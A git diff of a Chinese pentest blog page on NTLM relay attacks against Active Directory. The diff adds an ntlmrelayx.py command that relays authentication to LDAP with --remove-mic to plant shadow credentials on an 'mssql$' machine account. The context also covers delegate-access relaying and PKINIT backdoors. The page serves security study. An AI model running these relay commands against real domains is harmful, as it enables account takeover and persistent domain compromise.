@@ -33,7 +33,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/songzhiv.github.io\/ntlm-relay\/"
-        },"image": ["https:\/\/songzhiv.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  3972 ,
+        },"image": ["https:\/\/songzhiv.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  4001 ,
         "url": "https:\/\/songzhiv.github.io\/ntlm-relay\/","datePublished": "2022-02-18T17:10:15+08:00","dateModified": "2022-02-21T21:11:59+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "nmk","logo": "https:\/\/songzhiv.github.io\/images\/avatar.png"},"author": {
@@ -110,7 +110,7 @@
             <div class="toc-content always-active" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">NTLM Relay</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>nmk</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/ad%E5%9F%9F/"><i class="far fa-folder fa-fw"></i>AD域</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-02-18">2022-02-18</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 3972 字&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-02-18">2022-02-18</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 4001 字&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 8 分钟&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
                 <div class="details-summary toc-title">
@@ -738,6 +738,28 @@ python3 ntlmrelayx.py -t ldap://10.10.10.10 -debug --remove-mic --delegate-acces
 <p>用户对象不能编辑自己的 msDS-KeyCredentialLink 属性，而机器账户可以。这意味着以下场景可以工作：从 DC01 触发 NTLM 身份验证，将其中继到 DC02，使 pywhisker 编辑 DC01 的属性以在其上创建 Kerberos PKINIT 预身份验证后门，并通过 PKINIT 和 pass-the-cache 持久访问 DC01。<br>
 计算机对象可以编辑它们自己的 msDS-KeyCredentialLink 属性，但只能在没有 KeyCredential 存在的情况下添加。</p>
 </blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">解决impacket报错
+python3 -m pip install .
+
+python3 ntlmrelayx.py --shadow-credentials  --shadow-target <span class="s1">&#39;mssql$&#39;</span> -t ldap://10.10.10.10 --remove-mic
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220223114929696.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220223114929696.png, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220223114929696.png 1.5x, https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220223114929696.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/songzhiv/image//blog/image-20220223114929696.png"
+        title="image-20220223114929696" /></p>
 <h3 id="rbcd">RBCD</h3>
 <p>基于资源的约束性委派又名RBCD。</p>
 <p>配置约束性委派和非约束性委派都需要<code>SeEnableDelegation</code>权限。而这个权限一般只有域管才有。为了赋予用户更大的灵活性，微软在<code>Windows server 2012</code>中引进基于资源的约束性委派。</p>
